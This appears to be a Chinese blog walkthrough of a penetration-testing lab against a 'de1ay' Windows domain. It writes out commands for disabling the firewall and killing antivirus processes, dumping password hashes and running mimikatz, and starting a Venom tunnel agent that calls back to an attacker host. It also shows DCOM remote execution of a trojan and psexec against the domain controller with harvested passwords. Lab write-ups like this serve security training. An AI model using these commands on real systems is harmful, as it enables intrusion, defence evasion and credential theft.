+<p>存在防火墙 的原因可能是 查询不到<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684239469013-7e3d4448-cb23-44b6-b6e4-82ae930838c0.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=443&id=ufa89966f&originHeight=443&originWidth=1350&originalType=binary&ratio=2&rotation=0&showTitle=false&size=54954&status=done&style=none&taskId=ub7170a0c-4702-4d32-89f9-e69188d2c5a&title=&width=1350" alt="image.png"><br>查看主域<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684239500835-85daea31-0d0a-44fb-8ea1-5e205e62b0d7.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=225&id=uafd0b13e&originHeight=225&originWidth=1146&originalType=binary&ratio=2&rotation=0&showTitle=false&size=26737&status=done&style=none&taskId=ucf2f4be6-a223-40f2-8ebb-01a3d2b07c5&title=&width=1146" alt="image.png"><br>查看域内用户 <br>还存在 krbtgt 用户，可能会用到票据把<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684239554339-9c681824-d224-4559-b079-8c27904f68c8.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=433&id=u22695c9e&originHeight=433&originWidth=1408&originalType=binary&ratio=2&rotation=0&showTitle=false&size=42049&status=done&style=none&taskId=udf48177e-0293-4488-8ce5-11af84f2e58&title=&width=1408" alt="image.png"><br>查看域内用户组列表<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684239662355-68290608-3608-420f-b50b-2f81108f69e4.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=757&id=uab2f31a2&originHeight=757&originWidth=1380&originalType=binary&ratio=2&rotation=0&showTitle=false&size=95176&status=done&style=none&taskId=ue503119b-88a1-431a-a88f-eac8f2e0c18&title=&width=1380" alt="image.png"><br>查看域内机器<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684239791375-3780620c-d506-4de3-bfe3-770387454ac2.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=484&id=uae4b1c03&originHeight=484&originWidth=1483&originalType=binary&ratio=2&rotation=0&showTitle=false&size=46931&status=done&style=none&taskId=u75c8a8f7-1fc0-4eae-9c2d-c369b61e665&title=&width=1483" alt="image.png"><br> 查看域管理员组</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">net group<span class="hljs-string">&quot;Enterprise Admins&quot;</span>/domain <br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684239938230-4fa03885-8c4d-4224-b1a3-f5dfc3f89e29.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=544&id=u4b9fab0a&originHeight=544&originWidth=1577&originalType=binary&ratio=2&rotation=0&showTitle=false&size=57796&status=done&style=none&taskId=u4d4dd77c-c4b6-4fd8-b752-7aa1986204b&title=&width=1577" alt="image.png"><br>关闭防火墙</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">run post/windows/manage/enable_rdp <br></code></pre></td></tr></table></figure>
+<p>但是好像没啥鸟用啊<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684240170989-043963f0-390c-4b23-8085-78148c5a025e.png#averageHue=%23191a1c&clientId=uf01e4eae-ddaf-4&from=paste&height=714&id=ua4598211&originHeight=714&originWidth=1847&originalType=binary&ratio=2&rotation=0&showTitle=false&size=168579&status=done&style=none&taskId=ub6c30a0b-0d9f-4494-b28b-5db05d266b0&title=&width=1847" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684240178082-b730848d-90eb-42dd-8bb1-a1b86f999cec.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=312&id=u94d42ca3&originHeight=312&originWidth=1937&originalType=binary&ratio=2&rotation=0&showTitle=false&size=59353&status=done&style=none&taskId=ud788d7ed-f1c5-40b9-87ec-cfd113b4d29&title=&width=1937" alt="image.png"><br>查看进程列表tasklist &#x2F;v查看杀软及相关进程服务</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tasklist /v<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684240410775-a216ae09-5338-4aac-a0be-6eb6ed556da8.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=1437&id=uf4c49801&originHeight=1437&originWidth=2723&originalType=binary&ratio=2&rotation=0&showTitle=false&size=299562&status=done&style=none&taskId=uf9e166ce-6b54-4218-8bcc-cadba658c35&title=&width=2723" alt="image.png">存在360<br>常见杀软进程</p>
+<table>
+<thead>
+<tr>
+<th>进程名</th>
+<th>杀软</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>360SD.exe</td>
+<td>360杀毒</td>
+</tr>
+<tr>
+<td>HipsMain.exe</td>
+<td>火绒</td>
+</tr>
+<tr>
+<td>SafeDog*</td>
+<td>安全狗</td>
+</tr>
+<tr>
+<td>D_Safe*</td>
+<td>D盾</td>
+</tr>
+<tr>
+<td>yunsuo*</td>
+<td>云锁</td>
+</tr>
+<tr>
+<td>hws*</td>
+<td>护卫神</td>
+</tr>
+<tr>
+<td>avp.exe</td>
+<td>卡巴斯基</td>
+</tr>
+<tr>
+<td>avcenter.exe</td>
+<td>小红伞</td>
+</tr>
+<tr>
+<td>Mcshield.exe</td>
+<td>_Mc_Afee</td>
+</tr>
+<tr>
+<td>QQPCRTP.exe</td>
+<td>QQ电脑管家</td>
+</tr>
+<tr>
+<td><em>hids</em></td>
+<td>主机防护类产品</td>
+</tr>
+</tbody></table>
+<p><a name="hn1Qf"></a></p>
+<h3><span id="关闭防火墙-x2f-360">关闭防火墙 &#x2F; 360</span></h3><p>因为老掉线，也可能是杀软的原因给杀了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684241213813-73430929-f509-4a03-ae65-1742451db354.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=192&id=u302998c8&originHeight=192&originWidth=1193&originalType=binary&ratio=2&rotation=0&showTitle=false&size=16393&status=done&style=none&taskId=ue5b3f636-e5ae-46e2-8904-00267e73fd4&title=&width=1193" alt="image.png"><br>杀掉 360的进程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"> ps | grep <span class="hljs-number">360</span><br> kill <span class="hljs-number">2988</span><br>.......<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684241366155-1e13a979-d200-464b-8ab0-b8ba12c1c444.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=843&id=u1244adad&originHeight=843&originWidth=1625&originalType=binary&ratio=2&rotation=0&showTitle=false&size=109148&status=done&style=none&taskId=ucd2d28ae-2621-46d8-a159-88c46d4c2d2&title=&width=1625" alt="image.png"><br>查看域内主机IP地址<br>使用MSF我觉得比for 循环快一点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use post/windows/gather/arp_scanner <br>set session 1<br>set rhosts 10.10.10.1-255<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684241960313-99d4187c-3bad-4fa4-ae2c-2a7f3626a6f5.png#averageHue=%23191a1c&clientId=uf01e4eae-ddaf-4&from=paste&height=328&id=u7f08674f&originHeight=328&originWidth=2136&originalType=binary&ratio=2&rotation=0&showTitle=false&size=86465&status=done&style=none&taskId=u0900be4d-96ff-4bf7-b8f1-0c8da1875e6&title=&width=2136" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[+]     IP: 10.10.10.1 MAC 00:50:56:c0:00:01 (VMware, Inc.)<br>[+]     IP: 10.10.10.10 MAC 00:0c:29:5c:b3:f1 (VMware, Inc.)<br>[+]     IP: 10.10.10.80 MAC 00:0c:29:a7:38:83 (VMware, Inc.)<br>[+]     IP: 10.10.10.201 MAC 00:0c:29:e3:1b:93 (VMware, Inc.)<br></code></pre></td></tr></table></figure>
+<p><a name="j05nP"></a></p>
+<h3><span id="抓取密码">抓取密码</span></h3><p>hashdump<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684242117345-e3dcf43c-a688-48b4-8ee9-c3437cc4737b.png#averageHue=%231e1f21&clientId=uf01e4eae-ddaf-4&from=paste&height=152&id=u305c8d35&originHeight=152&originWidth=1383&originalType=binary&ratio=2&rotation=0&showTitle=false&size=34477&status=done&style=none&taskId=u4e98c5b9-312d-48e5-bec2-b78ffda9eb5&title=&width=1383" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>de1ay:1000:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure>
+<p>de1ay : Admin@123<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684242243819-3743790b-8f12-47e4-8e23-3956c8630333.png#averageHue=%23f6f5f5&clientId=uf01e4eae-ddaf-4&from=paste&height=386&id=u098871a7&originHeight=386&originWidth=855&originalType=binary&ratio=2&rotation=0&showTitle=false&size=25783&status=done&style=none&taskId=u8c5735f7-f48e-4543-93a9-249b7a8283d&title=&width=855" alt="image.png"><br>上传mimikatz<br>因为已经关掉360了就不会被杀掉，不然需要做免杀（还不会免杀 …..）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684242734809-0484a836-1c15-4591-bccf-ea4fde9b008b.png#averageHue=%23191a1c&clientId=uf01e4eae-ddaf-4&from=paste&height=214&id=u368e8b1d&originHeight=214&originWidth=1782&originalType=binary&ratio=2&rotation=0&showTitle=false&size=41012&status=done&style=none&taskId=uad3d6bba-55de-4429-be72-f9d4f093b60&title=&width=1782" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">启动 提升权限 抓取密码<br>mimitakz.exe<br>privilege::debug<br>sekurlsa::logonPasswords<br><br></code></pre></td></tr></table></figure>
+<p>发现存在一个问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684243782354-6435f049-cc37-4c5a-a207-01e9b06f6cec.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=662&id=u45bef655&originHeight=662&originWidth=1375&originalType=binary&ratio=2&rotation=0&showTitle=false&size=92434&status=done&style=none&taskId=u895e7f8a-fc68-47b3-bdc7-2d381aba31c&title=&width=1375" alt="image.png"><br>mimikatz模块需要两个条件：<br>1.权限Admistrator或system；<br>2.支持32&#x2F;64位，但默认加载32位，对于64位很多模块无法默认加载，需要把meterpreter进程迁移到一个64位程序的进程中，才能正常使用。<br><a name="uYxg5"></a></p>
+<h4><span id="使用kiwi模块-里面的mimikatz">使用kiwi模块 里面的mimikatz</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">help kiwi<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684243938949-52b550f0-2ea4-4256-a133-e739acab0d89.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=1257&id=u5fea9d2f&originHeight=1257&originWidth=1936&originalType=binary&ratio=2&rotation=0&showTitle=false&size=160190&status=done&style=none&taskId=u7aa55b02-9751-4102-9a66-1905d4f8730&title=&width=1936" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">列举所有凭据：creds_all<br>列举所有kerberos凭据：creds_kerberos<br>调用kiwi_cmd执行mimikatz命令：kiwi_cmd sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684244015932-8e52df28-11e1-4e4f-97bd-627f3f865993.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=1094&id=u08215fe1&originHeight=1094&originWidth=1635&originalType=binary&ratio=2&rotation=0&showTitle=false&size=152507&status=done&style=none&taskId=u038341b5-cdb5-4192-b602-4c8fef4cdb3&title=&width=1635" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684244067210-6f866079-c9c6-49b7-9632-54cdf12058c7.png#averageHue=%23161719&clientId=uf01e4eae-ddaf-4&from=paste&height=1513&id=uf96f0720&originHeight=1513&originWidth=2268&originalType=binary&ratio=2&rotation=0&showTitle=false&size=214789&status=done&style=none&taskId=u401dea7f-5ad8-4789-8450-19c7dc27394&title=&width=2268" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684244098989-1c895de3-669d-4029-b10e-fa13299debe4.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=1500&id=ue58a445c&originHeight=1500&originWidth=1860&originalType=binary&ratio=2&rotation=0&showTitle=false&size=218564&status=done&style=none&taskId=u61f86523-2ed1-4766-859e-8130bd9ef76&title=&width=1860" alt="image.png"><br><a name="Scz3h"></a></p>
+<h3><span id="获取到的基本信息">获取到的基本信息</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">主域：<br>DC.de1ay.com<br><br>域用户<br>-------------------------------------------------------------------------------<br>Administrator            de1ay                    Guest                    <br>krbtgt                   mssql  <br><br><br>域内机器<br>DC$  WEB$ PC$<br><br><br>域管理员<br>Administrator  <br><br>存在杀软 360 防火墙<br><br>内网主机IP地址<br>10.10.10.10   域控<br>10.10.10.80	  WEB	<br>10.10.10.201  PC           <br><br>WEB 主机 密码<br>de1ay Admin@123<br><br>域内：<br>* Username : Administrator<br>* Domain   : DE1AY<br>* Password : 1qaz@WSX<br><br>* Username : mssql<br>* Domain   : DE1AY<br>* Password : 1qaz@WSX<br></code></pre></td></tr></table></figure>
+<p><a name="ha922"></a></p>
+<h3><span id="搭建隧道">搭建隧道</span></h3><p>上传 Venom</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Kali <br>./admin_linux_x64 -lport 2222<br>win08 <br>agent.exe -rhost 192.168.145.130 -rport 2222<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684245387469-e6314abb-c826-46bc-9774-fbf3f8fa480d.png#averageHue=%2317191b&clientId=uf01e4eae-ddaf-4&from=paste&height=443&id=ue9726ad4&originHeight=443&originWidth=1816&originalType=binary&ratio=2&rotation=0&showTitle=false&size=45378&status=done&style=none&taskId=u1416155f-283c-4f3c-80b1-a33920ee78a&title=&width=1816" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684245377614-895d87c3-49f0-4bb9-8c28-1b6a27c937f1.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=168&id=u2b8a2440&originHeight=168&originWidth=1235&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28735&status=done&style=none&taskId=ub7db8388-a98a-43ea-a484-9e25c188e5f&title=&width=1235" alt="image.png">接收到之后连接 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684245414697-8d7dff62-f029-4b8d-9a3f-0bb115a4296f.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=407&id=u04635925&originHeight=407&originWidth=1671&originalType=binary&ratio=2&rotation=0&showTitle=false&size=38360&status=done&style=none&taskId=u67eaf87f-c81f-473a-8cd0-34e0bcb4b4b&title=&width=1671" alt="image.png"><br>设置socks 3333端口 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684245437280-7cede400-88ff-459b-a7b4-9609c3ebdd86.png#averageHue=%231b1e22&clientId=uf01e4eae-ddaf-4&from=paste&height=129&id=ua6b026b3&originHeight=129&originWidth=800&originalType=binary&ratio=2&rotation=0&showTitle=false&size=20046&status=done&style=none&taskId=u8010dea0-f017-4e69-9928-7743c4749a2&title=&width=800" alt="image.png"><br>使用nmap 查看是否开启 445,3389端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这里需要注意的事nmap的ping是依据icmp包进行传输的。<br>而proxychains无法代理icmp包。<br>所以nmap + ip地址是无法进行探测的<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684246233556-ad4dba07-bc12-478a-8f7c-0db298434da1.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=1023&id=u77b49cbf&originHeight=1023&originWidth=1798&originalType=binary&ratio=2&rotation=0&showTitle=false&size=182224&status=done&style=none&taskId=u1a0b9a17-2069-4864-beb2-379afdf10b1&title=&width=1798" alt="image.png"><br>开启的 <br>使用rdeskstop 去访问看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684246546079-add8db9e-ff3c-42f3-ae8a-b8f805a0a688.png#averageHue=%23195975&clientId=uf01e4eae-ddaf-4&from=paste&height=801&id=u5c34e8c2&originHeight=801&originWidth=1060&originalType=binary&ratio=2&rotation=0&showTitle=false&size=58041&status=done&style=none&taskId=uc069c234-87f6-4dad-8c8b-bd63bda4784&title=&width=1060" alt="image.png"></p>
+<p><a name="bnEzh"></a></p>
+<h1><span id="横向移动-gt-pc">横向移动 —&gt; PC$</span></h1><p><a name="XuXht"></a></p>
+<h2><span id="dcom">DCOM</span></h2><p>控制WEB主机与PC建立一个ipc$连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net use \\10.10.10.201\ipc$ &quot;1qaz@WSX&quot; /user:administrator<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684247739343-d0d6e126-9408-4640-a1c9-07a2007f1221.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=275&id=uc9df953e&originHeight=275&originWidth=1301&originalType=binary&ratio=2&rotation=0&showTitle=false&size=32634&status=done&style=none&taskId=u54d8d12e-6945-450e-a5e6-ab593bc93c3&title=&width=1301" alt="image.png"><br>新生成一个msf木马win.exe，上传到WEB主机上，然后在WEB主机上执行命令，将木马复制到远程主机PC上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">copy win.exe \\10.10.10.201\C$<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684247879343-eb92b20b-58d1-4936-ba93-552d27e3c882.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=166&id=u862989ef&originHeight=166&originWidth=968&originalType=binary&ratio=2&rotation=0&showTitle=false&size=18289&status=done&style=none&taskId=u219ad1a1-7230-4739-a155-e4ac470259b&title=&width=968" alt="image.png"><br>然后再meterpreter中载入powershell模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">load powershell     // 载入powershell模块<br>powershell_shell    // 进入powershell交互模式d<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684247956408-7b174608-6ea3-48b8-b599-2f1d49501c61.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=172&id=u41ae5dd1&originHeight=172&originWidth=1115&originalType=binary&ratio=2&rotation=0&showTitle=false&size=19427&status=done&style=none&taskId=u37587cde-d67d-4a74-9455-a26cc1af24f&title=&width=1115" alt="image.png"><br>在powershell里面执行如下命令，控制WEB主机使用DCOM在远程机器PC上执行刚刚上传到PC主机C盘里的木马：<br>结果全是报错。。。。。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684248651105-d9fa3db0-00f9-4e52-bef2-c83e50bc88a5.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=1536&id=u40e598af&originHeight=1536&originWidth=2314&originalType=binary&ratio=2&rotation=0&showTitle=false&size=330237&status=done&style=none&taskId=ud4320f2e-063e-4e60-a00c-de1cbc20b72&title=&width=2314" alt="image.png"><br><a name="UbhzD"></a></p>
+<h3><span id="dcom的方法">DCOM的方法</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">方法一<br>$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;1.1.1.1&quot;))<br>$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;)<br>方法二<br>$com=[Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;,&quot;1.1.1.1&quot;)<br>$obj=[System.Activator]::CreateInstance($com)<br>$item=$obj.item()<br>$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<br>方法三<br>$com=[Type]::GetTypeFromCLSID(&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;,&quot;1.1.1.1&quot;)<br>$obj=[System.Activator]::CreateInstance($com)<br>$obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<br></code></pre></td></tr></table></figure>
+<p>我们这里的使用方式是使用DCOM去运行 win,exe 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$com = [Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;,&quot;10.10.10.201&quot;)<br>$obj = [System.Activator]::CreateInstance($com)<br>$item = $obj.item()<br>$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c c:win.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<br></code></pre></td></tr></table></figure>
+<p>既然此方法不通，再尝试使用MS17-010<br>设置MSF代理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684249118384-0f2dc75a-01a6-4e7f-90ee-cd8b1b835bb3.png#averageHue=%23161719&clientId=uf01e4eae-ddaf-4&from=paste&height=957&id=ufbfcffd6&originHeight=957&originWidth=1606&originalType=binary&ratio=2&rotation=0&showTitle=false&size=131824&status=done&style=none&taskId=u3d067c10-36e7-4c9c-8846-84cdbdde32c&title=&width=1606" alt="image.png"><br>使用MS17-010 失败<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684249301073-096be4fe-2ec2-4339-b928-3a4a1ae76850.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=687&id=uddffb576&originHeight=687&originWidth=1873&originalType=binary&ratio=2&rotation=0&showTitle=false&size=154511&status=done&style=none&taskId=u1aaf1bfa-b173-45b8-8f29-05b808ec627&title=&width=1873" alt="image.png"><br>其实还有个更加简单的方法 ，不是已经获取到密码了 直接域用户远程登录 ，点击win.exe 返回shell<br> 点击win 就可以获取权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684250184176-42ad83da-2a85-41f0-9add-f4cfe67f52b3.png#averageHue=%2327303b&clientId=uf01e4eae-ddaf-4&from=paste&height=1432&id=u8db005ef&originHeight=1432&originWidth=2576&originalType=binary&ratio=2&rotation=0&showTitle=false&size=968246&status=done&style=none&taskId=uce8a22fb-54a1-4f90-8d94-e47c2fb2525&title=&width=2576" alt="image.png"><br>这样就成功返回shell了 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684250359112-b260ad96-63ce-4bc1-a155-1852182e5315.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=132&id=uddd07517&originHeight=132&originWidth=980&originalType=binary&ratio=2&rotation=0&showTitle=false&size=12998&status=done&style=none&taskId=u14a3a563-3133-4b48-a5ef-261d0cedab4&title=&width=980" alt="image.png"><br>但是这样获取的权限较低了<br><a name="lS3qw"></a></p>
+<h2><span id="派生给cs">派生给CS</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684251600826-7117c5cd-1a1f-4094-9b64-67317e914307.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=696&id=u83ef37e8&originHeight=696&originWidth=1894&originalType=binary&ratio=2&rotation=0&showTitle=false&size=161062&status=done&style=none&taskId=u9641a8e6-951f-4c3d-b6d6-f8aa2b52db7&title=&width=1894" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684251456968-45051dd5-b96e-491a-aeb2-c03e09d87d99.png#averageHue=%2381c294&clientId=uf01e4eae-ddaf-4&from=paste&height=815&id=uc94d4c4e&originHeight=815&originWidth=1687&originalType=binary&ratio=2&rotation=0&showTitle=false&size=47180&status=done&style=none&taskId=ub16c358d-3771-41f4-9de8-e5dc015a556&title=&width=1687" alt="image.png"><br>使用MS16-016 提权成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684252136993-e339197a-ef4b-4b37-80ca-066763f6c3fa.png#averageHue=%23161310&clientId=uf01e4eae-ddaf-4&from=paste&height=433&id=ud6653aab&originHeight=433&originWidth=810&originalType=binary&ratio=2&rotation=0&showTitle=false&size=39424&status=done&style=none&taskId=ud12d0a03-332a-4429-be93-690f6871949&title=&width=810" alt="image.png"></p>
+<p><a name="ThGwC"></a></p>
+<h1><span id="域控">域控</span></h1><p>直接利用msf的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块进行哈希传递</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span><br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass 1qaz@WSX<br>run<br></code></pre></td></tr></table></figure>
